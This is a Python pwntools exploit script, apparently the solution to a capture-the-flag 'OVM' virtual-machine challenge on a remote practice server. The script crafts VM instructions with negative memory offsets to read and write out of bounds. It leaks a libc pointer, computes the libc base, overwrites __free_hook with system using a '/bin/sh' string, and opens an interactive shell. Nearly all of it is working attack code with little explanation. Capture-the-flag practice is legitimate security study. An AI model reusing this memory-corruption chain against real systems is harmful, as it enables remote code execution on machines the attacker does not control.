from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27397)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
libc = ELF('libc-2.23.so')
elf = ELF('./pwn')


def set_reg(num1, num2, num3):
    return (0x10 << 24) + (num1 << 16) + (num2 << 8) + num3


def load(num1, num2, num3):
    return (0x30 << 24) + (num1 << 16) + (num2 << 8) + num3


def store(num1, num2, num3):
    return (0x40 << 24) + (num1 << 16) + (num2 << 8) + num3


def add(num1, num2, num3):
    return (0x70 << 24) + (num1 << 16) + (num2 << 8) + num3


def sub(num1, num2, num3):
    return (0x80 << 24) + (num1 << 16) + (num2 << 8) + num3 - (1 << 32)


def xor(num1, num2, num3):
    return (0xb0 << 24) + (num1 << 16) + (num2 << 8) + num3 - (1 << 32)


def left(num1, num2, num3):
    return (0xc0 << 24) + (num1 << 16) + (num2 << 8) + num3 - (1 << 32)


def halt():
    return (0xe0 << 24) - (1 << 32)


'''
instruction = (op << 24) + (num1 << 16) + (num2 << 8) + num3
SP: reg[13] PC: reg[15]
op = 0x10 reg[num1] = num3            
op = 0x20 reg[num1] = (num3 == 0)
op = 0x30 reg[num1] = memory[reg[num3]]
op = 0x40 memory[reg[num3]] = reg[num1]
op = 0x50 stack[SP++] = reg[num1];
op = 0x60 reg[num1] = stack[--SP]
op = 0x70 reg[num1] = reg[num2] + reg[num3]
op = 0x80 reg[num1] = reg[num2] - reg[num3]
op = 0x90 reg[num1] = reg[num2] & reg[num3]
op = 0xa0 reg[num1] = reg[num2] | reg[num3]
op = 0xb0 reg[num1] = reg[num2] ^ reg[num3]
op = 0xc0 reg[num1] = reg[num2] << reg[num3]
op = 0xd0 reg[num1] = reg[num2] >> reg[num3]
op = 0xe0 if sp == 0: halt; else: jump 0xff
op = 0xff print reg[0:16] halt;
op = (0xd0, 0xe0) | (0xe0, 0xff) nop
'''

instructions = [
    set_reg(1, 0, 26),              # reg[1] = 26
    set_reg(2, 0, 1),               # reg[2] = 1
    set_reg(3, 0, 0x10),            # reg[3] = 0x10
    set_reg(4, 0, 0xa0),            # reg[4] = 0xa0
    set_reg(5, 0, 8),               # reg[5] = 8
    sub(0, 0, 1),                   # reg[0] -= 26
    load(6, 0, 0),                  # reg[6] = memory[-26]
    add(0, 0, 2),                   # reg[0]++
    load(7, 0, 0),                  # reg[7] = memory[-25]
    left(3, 3, 5),                  # reg[3] <<= 8
    add(3, 3, 4),                   # reg[3] += 0xa0
    add(6, 6, 3),                   # reg[6] += 0x10a0
    xor(0, 0, 0),                   # reg[0] ^= reg[0]
    sub(0, 0, 5),                   # reg[0] -= 8
    store(6, 0, 0),                 # memory[-8] = reg[6]
    add(0, 0, 2),                   # reg[0]++
    store(7, 0, 0),                # memory[-7] = reg[7]     
    halt()
]

def pwn():
    io.sendlineafter('PC: ', '0')
    io.sendlineafter('SP: ', '1')
    io.sendlineafter('CODE SIZE: ', str(len(instructions)))
    io.recvuntil('CODE: ')
    for instrution in instructions:
        io.sendline(str(instrution))
    io.recvuntil('R6: ')
    low = int(io.recvline()[:-1], 16)
    io.recvuntil('R7: ')
    high = int(io.recvline()[:-1], 16)
    libc_base = ((high << 32) + low) - libc.sym['__free_hook'] + 8
    log.success('libc_base: ' + hex(libc_base))
    system = libc_base + libc.sym['system']
    # gdb.attach(io)
    # pause()
    io.sendlineafter('HOW DO YOU FEEL AT OVM?\n', b'/bin/sh\x00' + p64(system))
    io.interactive()


if __name__ == '__main__':
    pwn()
